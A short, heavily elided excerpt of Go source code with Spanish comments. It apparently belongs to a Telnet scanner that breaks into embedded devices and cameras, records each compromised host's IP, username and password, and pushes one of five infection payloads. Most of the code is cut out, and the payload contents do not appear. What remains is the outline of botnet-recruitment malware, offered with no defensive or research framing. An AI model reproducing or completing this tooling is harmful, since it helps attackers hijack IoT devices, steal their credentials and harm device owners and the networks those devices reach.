...
// PAYLOAD CÁMARAS - Para sistemas embebidos muy limitados
...
// PAYLOAD ULTRA BÁSICO - Para sistemas sin wget
...
// PAYLOAD COMBINADO FINAL - Intenta todos los métodos
...
func (s *TelnetScanner) saveLoader(host, username, password string) {
	...
	// Solo guardar IP:usuario:contraseña
...
func (s *TelnetScanner) Run() {
	...
	fmt.Println("║     (5 PAYLOADS - Todos los sistemas)  ║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Printf("Workers: %d\n", MAX_WORKERS)
	fmt.Printf("Payloads: Moderno | Viejo | Cámaras | Básico | Final\n\n")
